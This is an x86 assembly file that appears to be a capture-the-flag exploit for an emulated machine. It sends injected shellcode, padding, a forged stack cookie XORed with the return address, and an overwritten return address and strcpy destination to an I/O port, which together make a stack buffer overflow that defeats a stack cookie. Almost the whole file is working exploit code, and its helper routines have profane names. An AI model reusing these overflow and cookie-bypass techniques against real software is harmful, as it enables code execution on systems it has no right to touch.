main:
pause
mov al, 0x61
out 0, al
pause
pause
pause

mov al, 0x31
out 0, al
pause
pause
pause

; 0:  33 c0          xor    eax,eax
; 2:  66 b8 d7 8d    mov    ax,0x8dd7 --- 'p' in cmp al, 'p' @ 103a
; 6:  fe 40 01       inc    BYTE PTR [eax+0x1]
; 9:  66 b8 a6 8d    mov    ax,0x8da6
; d:  ff d0          call   eax

push 0xb866c033
call cunt
push 0x40fe8dd7
call cunt
push 0xa6b86601
call cunt
push 0x00d0ff8d
call cunt

push 0x41 ; pad
push 16
call bitch

push 0x2C1633DC ; function cookie ^ ret addr
call cunt

push 0x00008000 ; esi
call cunt
push 0x00008000 ; ebp
call cunt

push 0x00008000 ; return addr
call cunt

push 0x00008000 ; strcpy overwrite dest
call cunt

mov al, 0xa
out 0, al

mov al, 0x41
out 1, al
hlt;

cunt: ; __stdcall cunt(int x)
	push ebp
	mov ebp, esp
	mov eax, [ebp+8]
	out 0, al
	shr eax, 8
	out 0, al
	shr eax, 8
	out 0, al
	shr eax, 8
	out 0, al
	leave
	ret 4

bitch: ; __stdcall bitch(int n, int val)
    push ebp
    mov ebp, esp
    mov eax, [ebp+12] ; val
    mov edx, [ebp+8] ; n
l:
    test edx, edx
    jz fin
    out 0, al
    dec edx
    jmp l
fin:
    leave
    ret 8

bitch2: ; __cdecl bitch2(int n)
    push ebp
    mov ebp, esp
    mov edx, [ebp+8] ; n
l2:
    test edx, edx
    jz fin2
    in al, 1
    out 1, al
    dec edx
    jmp l2
fin2:
    leave
    ret

p: ; __cdecl p(char c)
    push ebp
    mov ebp, esp
    mov eax, [ebp+8]
    mov ecx, eax
    and al, 0xf0
    shr eax, 4
    and cl, 0x0f
    add al, 0x61
    add cl, 0x61
    out 1, al
    mov al, cl
    out 1, al
    mov al, 0x20
    out 1, al
    leave
    ret

.data
cookie:
db 0, 0, 0, 0